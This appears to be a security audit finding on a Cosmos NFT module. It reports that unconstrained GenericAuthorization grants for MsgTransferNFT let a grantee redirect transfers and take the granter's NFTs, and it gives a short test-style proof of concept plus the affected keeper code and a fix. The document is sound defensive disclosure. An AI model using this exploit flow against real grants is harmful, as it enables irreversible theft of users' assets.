### Title
Unconstrained `GenericAuthorization` for `MsgTransferNFT` Allows Grantee to Steal NFTs — (`x/nft/types/msgs.go`, `x/nft/keeper/keeper.go`)

### Summary

The NFT module implements no custom `Authorization` type for `MsgTransferNFT`. Any authz grant for this message type therefore falls back to `GenericAuthorization`, which places zero constraints on the `Recipient` field. A grantee can construct `MsgExec{MsgTransferNFT{Sender=granter, Recipient=attacker}}` and steal the granter's NFT in a single transaction.

### Finding Description

`MsgTransferNFT.GetSigners()` returns only `[msg.Sender]`: [1](#0-0) 

The authz module's `MsgExec` handler verifies that the granter's address matches `GetSigners()` of the inner message, then dispatches it. Because `Recipient` is not part of `GetSigners()`, the authz module never inspects or constrains it.

`msgServer.TransferNFT` passes `msg.Recipient` directly to `TransferOwner`: [2](#0-1) 

`TransferOwner` only verifies that `srcOwner` (= `msg.Sender` = granter) is the current owner. It performs no check on `dstOwner`: [3](#0-2) 

The NFT module registers no custom `Authorization` implementation for `MsgTransferNFT` — no `TransferAuthorization` analogue exists anywhere in the module: [4](#0-3) 



This means the only available authz grant type is `GenericAuthorization`, which accepts any instance of the message type without field-level constraints.

### Impact Explanation

An attacker who has been issued a `GenericAuthorization` for `MsgTransferNFT` (e.g., by a marketplace integration, a delegated operator, or any scenario where the owner intended to allow controlled transfers) can redirect the transfer to their own address. The NFT ownership record is permanently updated to the attacker's address with no recourse. This is direct, irreversible theft of an economically valuable NFT.

### Likelihood Explanation

The precondition — a `GenericAuthorization` grant for `MsgTransferNFT` — is realistic. Marketplace contracts, custodial services, and delegated trading bots routinely receive such grants. Because the NFT module provides no constrained `TransferAuthorization` type, users have no alternative to `GenericAuthorization` when they want to delegate transfer capability. Any such grant is exploitable.

### Recommendation

Implement a custom `TransferAuthorization` type for `MsgTransferNFT` (analogous to the Cosmos SDK bank module's `SendAuthorization`) that constrains the allowed `Recipient` addresses and/or `DenomId`/token IDs. Register it via `RegisterInterfaces` so it is available as an alternative to `GenericAuthorization`. The `Accept` method should reject any inner message whose `Recipient` is not in the pre-approved list.

### Proof of Concept

```
// 1. granter owns NFT (denomID="testdenom", tokenID="token1")
// 2. granter issues GenericAuthorization for MsgTransferNFT to attacker
grant := authz.NewGenericAuthorization("/chainmain.nft.v1.MsgTransferNFT")
authzKeeper.SaveGrant(ctx, attacker, granter, grant, expiry)

// 3. attacker submits MsgExec wrapping MsgTransferNFT{Sender=granter, Recipient=attacker}
inner := types.MsgTransferNFT{
    Id:        "token1",
    DenomId:   "testdenom",
    Sender:    granter.String(),
    Recipient: attacker.String(),
}
exec := authz.NewMsgExec(attacker, []sdk.Msg{&inner})
// authz module: grant found, GetSigners()=[granter] satisfied → dispatch
// TransferOwner: IsOwner(granter) passes → nft.Owner = attacker
// assert: nftKeeper.GetNFT(ctx, "testdenom", "token1").GetOwner() == attacker ✓
```

func (m msgServer) TransferNFT(goCtx context.Context, msg *types.MsgTransferNFT) (*types.MsgTransferNFTResponse, error) {
	sender, err := sdk.AccAddressFromBech32(msg.Sender)
	if err != nil {
		return nil, err
	}

	recipient, err := sdk.AccAddressFromBech32(msg.Recipient)
	if err != nil {
		return nil, err
	}

	ctx := sdk.UnwrapSDKContext(goCtx)
	if err := m.TransferOwner(ctx, msg.DenomId, msg.Id,
		sender,
		recipient,
	); err != nil {
		return nil, err
	}

func (k Keeper) TransferOwner(
	ctx sdk.Context, denomID, tokenID string, srcOwner, dstOwner sdk.AccAddress,
) error {
	if !k.HasDenomID(ctx, denomID) {
		return sdkerrors.Wrapf(types.ErrInvalidDenom, "denom ID %s not exists", denomID)
	}

	nft, err := k.IsOwner(ctx, denomID, tokenID, srcOwner)
	if err != nil {
		return err
	}

	nft.Owner = dstOwner.String()

	k.setNFT(ctx, denomID, nft)
	k.swapOwner(ctx, denomID, tokenID, srcOwner, dstOwner)
	return nil
}
